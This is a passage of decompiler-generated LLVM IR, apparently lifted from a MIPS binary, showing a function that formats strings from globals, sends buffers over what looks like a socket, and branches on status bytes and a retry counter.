  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_4087a0.162 to i32), i32* @a1, align 4
  %v8_40351c = call i32 @function_403f6c(i8* %v7_4034e8, i32 ptrtoint ([11 x i8]* @global_var_4087a0.162 to i32))
  store i32 %v8_40351c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403528 = load i32, i32* @s3, align 4
  %v1_403528 = add i32 %v0_403528, 1044
  %v2_403528 = inttoptr i32 %v1_403528 to i32*
  %v3_403528 = load i32, i32* %v2_403528, align 4
  store i32 %v3_403528, i32* %v0.global-to-local, align 4
  %v1_403530 = add i32 %v3_403528, 4
  %v2_403530 = inttoptr i32 %v1_403530 to i32*
  %v3_403530 = load i32, i32* %v2_403530, align 4
  store i32 %v3_403530, i32* @a1, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v6_403534 = call i32 @function_403f6c(i8* %v7_4034e8, i32 %v3_403530)
  store i32 %v6_403534, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([88 x i8]* @global_var_4087ac.163 to i32), i32* @a1, align 4
  %v8_403550 = call i32 @function_403f6c(i8* %v7_4034e8, i32 ptrtoint ([88 x i8]* @global_var_4087ac.163 to i32))
  store i32 %v8_403550, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40355c = load i32, i32* @s3, align 4
  %v1_40355c = add i32 %v0_40355c, 1042
  %v2_40355c = inttoptr i32 %v1_40355c to i8*
  %v3_40355c = load i8, i8* %v2_40355c, align 1
  %v4_40355c = zext i8 %v3_40355c to i32
  %v1_403564 = add nuw nsw i32 %v4_40355c, 1
  %v3_403568 = load i32, i32* @global_var_449d88.145, align 4
  store i32 %v3_403568, i32* %s2.global-to-local, align 4
  %v1_40356c = urem i32 %v1_403564, 256
  store i32 %v1_40356c, i32* %v1.global-to-local, align 4
  store i32 16711680, i32* %v0.global-to-local, align 4
  store i32 16777215, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40357c

dec_label_pc_40357c:                              ; preds = %dec_label_pc_4035a0, %dec_label_pc_4034b0
  %v0_4035a0 = phi i32 [ %v3_4035a0, %dec_label_pc_4035a0 ], [ %v3_403568, %dec_label_pc_4034b0 ]
  %v1_40357c = inttoptr i32 %v0_4035a0 to i32*
  %v2_40357c = load i32, i32* %v1_40357c, align 4
  %v2_403584 = urem i32 %v2_40357c, 16777216
  store i32 %v2_403584, i32* %v0.global-to-local, align 4
  %v1_403588 = icmp eq i32 %v2_403584, 0
  br i1 %v1_403588, label %dec_label_pc_4035a0, label %dec_label_pc_40358c

dec_label_pc_40358c:                              ; preds = %dec_label_pc_40357c
  %v1_403590 = add i32 %v0_4035a0, 2
  %v2_403590 = inttoptr i32 %v1_403590 to i8*
  %v3_403590 = load i8, i8* %v2_403590, align 1
  %v4_403590 = zext i8 %v3_403590 to i32
  store i32 %v4_403590, i32* %v0.global-to-local, align 4
  %v2_403598 = icmp eq i32 %v4_403590, %v1_40356c
  br i1 %v2_403598, label %dec_label_pc_4035b4, label %dec_label_pc_4035a0

dec_label_pc_4035a0:                              ; preds = %dec_label_pc_40358c, %dec_label_pc_40357c
  %v1_4035a0 = add i32 %v0_4035a0, 8
  %v2_4035a0 = inttoptr i32 %v1_4035a0 to i32*
  %v3_4035a0 = load i32, i32* %v2_4035a0, align 4
  store i32 %v3_4035a0, i32* %s2.global-to-local, align 4
  %v1_4035a8 = icmp eq i32 %v3_4035a0, 0
  br i1 %v1_4035a8, label %dec_label_pc_4035ac, label %dec_label_pc_40357c

dec_label_pc_4035ac:                              ; preds = %dec_label_pc_4035a0
  store i32 %stack_var_-48.1, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4035b4

dec_label_pc_4035b4:                              ; preds = %dec_label_pc_40358c, %dec_label_pc_4035ac
  %v0_4035bc = phi i32 [ %stack_var_-48.1, %dec_label_pc_4035ac ], [ %v0_4035a0, %dec_label_pc_40358c ]
  %v1_4035bc = add i32 %v0_4035bc, 4
  %v2_4035bc = inttoptr i32 %v1_4035bc to i32*
  %v3_4035bc = load i32, i32* %v2_4035bc, align 4
  store i32 %v3_4035bc, i32* @a1, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v6_4035c0 = call i32 @function_403f6c(i8* %v7_4034e8, i32 %v3_4035bc)
  store i32 %v6_4035c0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_408804.164 to i32), i32* @a1, align 4
  %v8_4035dc = call i32 @function_403f6c(i8* %v7_4034e8, i32 ptrtoint ([17 x i8]* @global_var_408804.164 to i32))
  store i32 %v8_4035dc, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4035f0 = load i32, i32* @s3, align 4
  %v1_4035f0 = add i32 %v0_4035f0, 8
  %v2_4035f0 = inttoptr i32 %v1_4035f0 to i32*
  %v3_4035f0 = load i32, i32* %v2_4035f0, align 4
  store i32 %v3_4035f0, i32* %s1.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v3_4035f4 = call i32 @function_403f48()
  store i32 %v3_4035f4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403600 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403600, i32* %a0.global-to-local, align 4
  %v3_403604 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403604, i32* @t9, align 4
  %v7_403610 = call i32 @function_405f30(i32 %v0_403600, i32* nonnull %stack_var_-1092, i32 %v3_4035f4, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403610, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403620 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_403620, i32* %v1.global-to-local, align 4
  %v1_403624 = icmp sgt i32 %v7_403610, 0
  %v3_403624 = add i32 %v3_403620, 10196
  %v0_403638.pre = load i32, i32* @s3, align 4
  br i1 %v1_403624, label %dec_label_pc_403638, label %dec_label_pc_403628

dec_label_pc_403628:                              ; preds = %dec_label_pc_4035b4
  store i32 %v0_403638.pre, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403638

dec_label_pc_403638:                              ; preds = %dec_label_pc_4035b4, %dec_label_pc_403628
  %v1_403638 = add i32 %v0_403638.pre, 1042
  %v2_403638 = inttoptr i32 %v1_403638 to i8*
  %v3_403638 = load i8, i8* %v2_403638, align 1
  %v4_403638 = zext i8 %v3_403638 to i32
  %v1_403640 = add nuw nsw i32 %v4_403638, 1
  store i32 %v1_403640, i32* %v0.global-to-local, align 4
  store i32 %v0_403638.pre, i32* %a0.global-to-local, align 4
  %v1_40364c = trunc i32 %v1_403640 to i8
  store i8 %v1_40364c, i8* %v2_403638, align 1
  call void @__pseudo_call(i32 %v3_403624)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403660 = load i32, i32* %s2.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4034c0, i32* @a0, align 4
  %v6_403674 = call i32 @function_404030(i32 %v2_4034c0, i32 0, i32 1024)
  store i32 %v6_403674, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v3_403688 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_403688, i32* @t9, align 4
  %v8_403690 = call i32 @function_403fcc(i8* %v7_4034e8, i32 ptrtoint ([27 x i8]* @global_var_408818.166 to i32))
  store i32 %v8_403690, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40369c = load i32, i32* @s3, align 4
  %v1_40369c = add i32 %v0_40369c, 1044
  %v2_40369c = inttoptr i32 %v1_40369c to i32*
  %v3_40369c = load i32, i32* %v2_40369c, align 4
  store i32 %v3_40369c, i32* %v0.global-to-local, align 4
  %v1_4036a4 = inttoptr i32 %v3_40369c to i32*
  %v2_4036a4 = load i32, i32* %v1_4036a4, align 4
  store i32 %v2_4036a4, i32* @a1, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v6_4036a8 = call i32 @function_403f6c(i8* %v7_4034e8, i32 %v2_4036a4)
  store i32 %v6_4036a8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_4087a0.162 to i32), i32* @a1, align 4
  %v8_4036c4 = call i32 @function_403f6c(i8* %v7_4034e8, i32 ptrtoint ([11 x i8]* @global_var_4087a0.162 to i32))
  store i32 %v8_4036c4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4036d0 = load i32, i32* @s3, align 4
  %v1_4036d0 = add i32 %v0_4036d0, 1044
  %v2_4036d0 = inttoptr i32 %v1_4036d0 to i32*
  %v3_4036d0 = load i32, i32* %v2_4036d0, align 4
  store i32 %v3_4036d0, i32* %v0.global-to-local, align 4
  %v1_4036d8 = add i32 %v3_4036d0, 4
  %v2_4036d8 = inttoptr i32 %v1_4036d8 to i32*
  %v3_4036d8 = load i32, i32* %v2_4036d8, align 4
  store i32 %v3_4036d8, i32* @a1, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v6_4036dc = call i32 @function_403f6c(i8* %v7_4034e8, i32 %v3_4036d8)
  store i32 %v6_4036dc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_408834.167 to i32), i32* @a1, align 4
  %v8_4036f8 = call i32 @function_403f6c(i8* %v7_4034e8, i32 ptrtoint ([14 x i8]* @global_var_408834.167 to i32))
  store i32 %v8_4036f8, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40370c = load i32, i32* @s3, align 4
  %v1_40370c = add i32 %v0_40370c, 8
  %v2_40370c = inttoptr i32 %v1_40370c to i32*
  %v3_40370c = load i32, i32* %v2_40370c, align 4
  store i32 %v3_40370c, i32* %s1.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v3_403710 = call i32 @function_403f48()
  store i32 %v3_403710, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40371c = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_40371c, i32* %a0.global-to-local, align 4
  %v3_403720 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403720, i32* @t9, align 4
  %v7_40372c = call i32 @function_405f30(i32 %v0_40371c, i32* nonnull %stack_var_-1092, i32 %v3_403710, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_40372c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_403738 = icmp slt i32 %v7_40372c, 1
  %v2_403738 = load i32, i32* @s3, align 4
  store i32 %v2_403738, i32* %a0.global-to-local, align 4
  br i1 %v1_403738, label %dec_label_pc_403c6c, label %dec_label_pc_40373c

dec_label_pc_40373c:                              ; preds = %dec_label_pc_403638
  %v3_403740 = load i32, i32* bitcast (i32** @global_var_449b3c.169 to i32*), align 4
  store i32 %v3_403740, i32* %v0.global-to-local, align 4
  %v1_403744 = add i32 %v2_403738, 1042
  %v2_403744 = inttoptr i32 %v1_403744 to i8*
  %v3_403744 = load i8, i8* %v2_403744, align 1
  %v4_403744 = zext i8 %v3_403744 to i32
  %v1_40374c = add nuw nsw i32 %v4_403744, 1
  store i32 %v1_40374c, i32* %v1.global-to-local, align 4
  %v2_403754 = icmp eq i32 %v1_40374c, ptrtoint (i32* @global_var_449b3d.170 to i32)
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_403754, label %dec_label_pc_403c80, label %dec_label_pc_403758

dec_label_pc_403758:                              ; preds = %dec_label_pc_40373c
  %v1_40375c = add i32 %v2_403738, 17
  %v2_40375c = inttoptr i32 %v1_40375c to i8*
  %v3_40375c = load i8, i8* %v2_40375c, align 1
  %v4_40375c = zext i8 %v3_40375c to i32
  store i32 %v4_40375c, i32* %v1.global-to-local, align 4
  %v2_403764 = icmp eq i8 %v3_40375c, 3
  br i1 %v2_403764, label %dec_label_pc_403768, label %dec_label_pc_403cb0

dec_label_pc_403768:                              ; preds = %dec_label_pc_403758
  store i32 %v2_4034c0, i32* %s1.global-to-local, align 4
  store i32 %v2_4034c0, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  %v4_403784 = call i32 @function_404030(i32 %v2_4034c0, i32 0, i32 1024)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_40379c = load i32, i32* @global_var_449b8c.141, align 4
  store i32 %v3_40379c, i32* @t9, align 4
  store i32 88, i32* %v0.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v5_4037b4 = call i32 @function_404b90(i32 %v2_4034c0, i32 ptrtoint ([860 x i8]* @global_var_408844.171 to i32), i32 185)
  store i32 %v5_4037b4, i32* %v0.global-to-local, align 4
  %v0_4037c4 = load i32, i32* @s3, align 4
  %v1_4037c4 = add i32 %v0_4037c4, 17
  %v2_4037c4 = inttoptr i32 %v1_4037c4 to i8*
  %v3_4037c4 = load i8, i8* %v2_4037c4, align 1
  %v4_4037c4 = zext i8 %v3_4037c4 to i32
  store i32 %v4_4037c4, i32* %v1.global-to-local, align 4
  %v2_4037cc = icmp eq i8 %v3_4037c4, 2
  store i32 3, i32* @v0, align 4
  br i1 %v2_4037cc, label %dec_label_pc_4037e0.thread, label %dec_label_pc_4037e0

dec_label_pc_4037e0.thread:                       ; preds = %dec_label_pc_403768
  store i32 %v0_4037c4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4037f0

dec_label_pc_4037e0:                              ; preds = %dec_label_pc_403768
  %v2_4037e0 = icmp eq i8 %v3_4037c4, 3
  store i32 %v0_4037c4, i32* %a0.global-to-local, align 4
  br i1 %v2_4037e0, label %dec_label_pc_4037e4, label %dec_label_pc_4037f0

dec_label_pc_4037e4:                              ; preds = %dec_label_pc_4037e0
  br label %dec_label_pc_4037f0

dec_label_pc_4037f0:                              ; preds = %dec_label_pc_4037e0.thread, %dec_label_pc_4037e0, %dec_label_pc_4037e4
  store i32 %stack_var_-52.3, i32* %a0.global-to-local, align 4
  %v1_4037f8 = add i32 %v0_4037c4, 8
  %v2_4037f8 = inttoptr i32 %v1_4037f8 to i32*
  %v3_4037f8 = load i32, i32* %v2_4037f8, align 4
  store i32 %v3_4037f8, i32* @s0, align 4
  %v1_4037fc = call i32 @function_403f48()
  store i32 %v1_4037fc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_40380c = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_40380c, i32* @t9, align 4
  %v0_403810 = load i32, i32* @s0, align 4
  store i32 %v0_403810, i32* %a0.global-to-local, align 4
  %v6_403818 = inttoptr i32 %stack_var_-52.3 to i32*
  %v7_403818 = call i32 @function_405f30(i32 %v0_403810, i32* %v6_403818, i32 %v1_4037fc, i32 16384, i32 ptrtoint (i32* @0 to i32))
  %v1_403820 = icmp slt i32 %v7_403818, 2
  %v2_403820 = zext i1 %v1_403820 to i32
  store i32 %v2_403820, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_403828 = icmp eq i1 %v1_403820, false
  %v2_403828 = load i32, i32* @s3, align 4
  store i32 %v2_403828, i32* %a0.global-to-local, align 4
  br i1 %v1_403828, label %dec_label_pc_403c6c, label %dec_label_pc_40382c

dec_label_pc_40382c:                              ; preds = %dec_label_pc_4037f0
  %v3_403834 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403834, i32* @t9, align 4
  %v1_403838 = add i32 %v2_403828, 8
  %v2_403838 = inttoptr i32 %v1_403838 to i32*
  %v3_403838 = load i32, i32* %v2_403838, align 4
  store i32 %v3_403838, i32* %a0.global-to-local, align 4
  %v8_403844 = call i32 @function_405f30(i32 %v3_403838, i32* bitcast ([3 x i8]* @global_var_408ba0.172 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_403844, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_403850 = icmp slt i32 %v8_403844, 1
  br i1 %v1_403850, label %dec_label_pc_403c68, label %dec_label_pc_403854

dec_label_pc_403854:                              ; preds = %dec_label_pc_40382c
  %v0_403858 = load i32, i32* @s3, align 4
  %v3_403868 = load i32, i32* @global_var_449a80.88, align 4
  %v1_403870 = add i32 %v3_403868, 9792
  store i32 %v0_403858, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403870)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403888 = load i32, i32* @s3, align 4
  store i32 %v0_403888, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403894

dec_label_pc_403894:                              ; preds = %dec_label_pc_4032f4.dec_label_pc_403894_crit_edge, %dec_label_pc_403854
  %v2_4038a4.pre-phi = phi i32 [ %.pre, %dec_label_pc_4032f4.dec_label_pc_403894_crit_edge ], [ %v2_4034c0, %dec_label_pc_403854 ]
  %v0_4038a8 = phi i32 [ %v0_403894.pre, %dec_label_pc_4032f4.dec_label_pc_403894_crit_edge ], [ %v0_403888, %dec_label_pc_403854 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_4032f4.dec_label_pc_403894_crit_edge ], [ %v0_403660, %dec_label_pc_403854 ]
  store i32 %v0_4038a8, i32* %a0.global-to-local, align 4
  store i32 %v2_4038a4.pre-phi, i32* %s1.global-to-local, align 4
  %v1_4038a8 = add i32 %v0_4038a8, 8
  %v2_4038a8 = inttoptr i32 %v1_4038a8 to i32*
  %v3_4038a8 = load i32, i32* %v2_4038a8, align 4
  store i32 %v3_4038a8, i32* @s0, align 4
  store i32 %v2_4038a4.pre-phi, i32* %a0.global-to-local, align 4
  %v3_4038ac = call i32 @function_403f48()
  store i32 %v3_4038ac, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4038b8 = load i32, i32* @s0, align 4
  store i32 %v0_4038b8, i32* %a0.global-to-local, align 4
  %v3_4038bc = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_4038bc, i32* @t9, align 4
  %v7_4038c8 = call i32 @function_405f30(i32 %v0_4038b8, i32* nonnull %stack_var_-1092, i32 %v3_4038ac, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_4038c8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_4038d4 = icmp slt i32 %v7_4038c8, 1
  br i1 %v1_4038d4, label %dec_label_pc_403c68, label %dec_label_pc_4038d8

dec_label_pc_4038d8:                              ; preds = %dec_label_pc_403894
  %v3_4038e0 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_4038e0, i32* @t9, align 4
  %v0_4038e4 = load i32, i32* @s3, align 4
  %v1_4038e4 = add i32 %v0_4038e4, 8
  %v2_4038e4 = inttoptr i32 %v1_4038e4 to i32*
  %v3_4038e4 = load i32, i32* %v2_4038e4, align 4
  store i32 %v3_4038e4, i32* %a0.global-to-local, align 4
  %v8_4038ec = call i32 @function_405f30(i32 %v3_4038e4, i32* bitcast ([3 x i8]* @global_var_408ba0.172 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_4038ec, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_4038fc = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_4038fc, i32* %v1.global-to-local, align 4
  %v1_403900 = icmp slt i32 %v8_4038ec, 0
  br i1 %v1_403900, label %dec_label_pc_403b70, label %dec_label_pc_403904

dec_label_pc_403904:                              ; preds = %dec_label_pc_4038d8
  store i32 %stack_var_-56.3, i32* %a0.global-to-local, align 4
  %v0_403918 = load i32, i32* @s3, align 4
  %v1_403918 = add i32 %v0_403918, 8
  %v2_403918 = inttoptr i32 %v1_403918 to i32*
  %v3_403918 = load i32, i32* %v2_403918, align 4
  store i32 %v3_403918, i32* @s0, align 4
  %v1_40391c = call i32 @function_403f48()
  store i32 %v1_40391c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_40392c = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_40392c, i32* @t9, align 4
  %v0_403930 = load i32, i32* @s0, align 4
  store i32 %v0_403930, i32* %a0.global-to-local, align 4
  %v6_403938 = inttoptr i32 %stack_var_-56.3 to i32*
  %v7_403938 = call i32 @function_405f30(i32 %v0_403930, i32* %v6_403938, i32 %v1_40391c, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403938, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_403944 = icmp slt i32 %v7_403938, 0
  br i1 %v1_403944, label %dec_label_pc_403c68, label %dec_label_pc_403948

dec_label_pc_403948:                              ; preds = %dec_label_pc_403904
  %v3_403950 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403950, i32* @t9, align 4
  %v0_403954 = load i32, i32* @s3, align 4
  %v1_403954 = add i32 %v0_403954, 8
  %v2_403954 = inttoptr i32 %v1_403954 to i32*
  %v3_403954 = load i32, i32* %v2_403954, align 4
  store i32 %v3_403954, i32* %a0.global-to-local, align 4
  %v8_40395c = call i32 @function_405f30(i32 %v3_403954, i32* bitcast ([3 x i8]* @global_var_408ba0.172 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_40395c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_40396c = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_40396c, i32* %v1.global-to-local, align 4
  %v0_403978 = load i32, i32* @s3, align 4
  %v1_403978 = add i32 %v0_403978, 17
  %v2_403978 = inttoptr i32 %v1_403978 to i8*
  %v3_403978 = load i8, i8* %v2_403978, align 1
  %v4_403978 = zext i8 %v3_403978 to i32
  store i32 %v4_403978, i32* %v1.global-to-local, align 4
  %v2_403980 = icmp eq i8 %v3_403978, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_403980, label %dec_label_pc_403994.thread, label %dec_label_pc_403994

dec_label_pc_403994.thread:                       ; preds = %dec_label_pc_403948
  store i32 %v0_403978, i32* %a0.global-to-local, align 4
  store i32 %v2_4038a4.pre-phi, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4039a8

dec_label_pc_403994:                              ; preds = %dec_label_pc_403948
  %v2_403994 = icmp eq i8 %v3_403978, 3
  store i32 %v2_4038a4.pre-phi, i32* %s1.global-to-local, align 4
  br i1 %v2_403994, label %dec_label_pc_403998, label %dec_label_pc_4039a8

dec_label_pc_403998:                              ; preds = %dec_label_pc_403994
  store i32 %v0_403978, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4039a8

dec_label_pc_4039a8:                              ; preds = %dec_label_pc_403994.thread, %dec_label_pc_403994, %dec_label_pc_403998
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4038a4.pre-phi, i32* @a0, align 4
  %v6_4039b4 = call i32 @function_404030(i32 %v2_4038a4.pre-phi, i32 0, i32 1024)
  store i32 %v6_4039b4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_4039c4 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_4039c4, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_4039cc = call i32 @function_4002d0(i32 22)
  store i32 %v2_4039cc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_4039dc = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_4039dc, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_4039e4 = call i32 @function_400564(i32 22)
  store i32 %v2_4039e4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v3_4039f4 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_4039f4, i32* @t9, align 4
  store i32 %v2_4039e4, i32* %s0.global-to-local, align 4
  %v3_4039fc = call i32 @function_400564(i32 22)
  store i32 %v3_4039fc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403a08 = load i32, i32* %s0.global-to-local, align 4
  %v3_403a10 = load i32, i32* @global_var_449b8c.141, align 4
  store i32 %v3_403a10, i32* @t9, align 4
  store i32 %v2_4038a4.pre-phi, i32* %a0.global-to-local, align 4
  %v7_403a1c = call i32 @function_404b90(i32 %v2_4038a4.pre-phi, i32 ptrtoint ([852 x i8]* @global_var_408bb4.175 to i32), i32 %v0_403a08)
  store i32 %v7_403a1c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403a2c = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_403a2c, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403a34 = call i32 @function_400418(i32 22)
  store i32 %v2_403a34, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403a48 = load i32, i32* @s3, align 4
  %v1_403a48 = add i32 %v0_403a48, 8
  %v2_403a48 = inttoptr i32 %v1_403a48 to i32*
  %v3_403a48 = load i32, i32* %v2_403a48, align 4
  store i32 %v3_403a48, i32* @s0, align 4
  store i32 %v2_4038a4.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403a4c = call i32 @function_403f48()
  store i32 %v3_403a4c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403a58 = load i32, i32* @s0, align 4
  store i32 %v0_403a58, i32* %a0.global-to-local, align 4
  %v3_403a5c = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403a5c, i32* @t9, align 4
  %v7_403a68 = call i32 @function_405f30(i32 %v0_403a58, i32* nonnull %stack_var_-1092, i32 %v3_403a4c, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403a68, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403a78 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_403a78, i32* %v1.global-to-local, align 4
  %v1_403a7c = icmp slt i32 %v7_403a68, 1
  br i1 %v1_403a7c, label %dec_label_pc_403b70, label %dec_label_pc_403a80

dec_label_pc_403a80:                              ; preds = %dec_label_pc_4039a8
  store i32 %v2_4038a4.pre-phi, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4038a4.pre-phi, i32* @a0, align 4
  %v6_403aa4 = call i32 @function_404030(i32 %v2_4038a4.pre-phi, i32 0, i32 1024)
  store i32 %v6_403aa4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403ab4 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_403ab4, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403abc = call i32 @function_4002d0(i32 22)
  store i32 %v2_403abc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403acc = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_403acc, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403ad4 = call i32 @function_400564(i32 22)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403aec = load i32, i32* @global_var_449b8c.141, align 4
  store i32 %v3_403aec, i32* @t9, align 4
  store i32 88, i32* %v0.global-to-local, align 4
  store i32 %v2_4038a4.pre-phi, i32* %a0.global-to-local, align 4
  %v7_403b08 = call i32 @function_404b90(i32 %v2_4038a4.pre-phi, i32 ptrtoint ([880 x i8]* @global_var_408f08.176 to i32), i32 185)
  store i32 %v7_403b08, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403b18 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_403b18, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403b20 = call i32 @function_400418(i32 22)
  store i32 %v2_403b20, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403b34 = load i32, i32* @s3, align 4
  %v1_403b34 = add i32 %v0_403b34, 8
  %v2_403b34 = inttoptr i32 %v1_403b34 to i32*
  %v3_403b34 = load i32, i32* %v2_403b34, align 4
  store i32 %v3_403b34, i32* @s0, align 4
  store i32 %v2_4038a4.pre-phi, i32* %a0.global-to-local, align 4
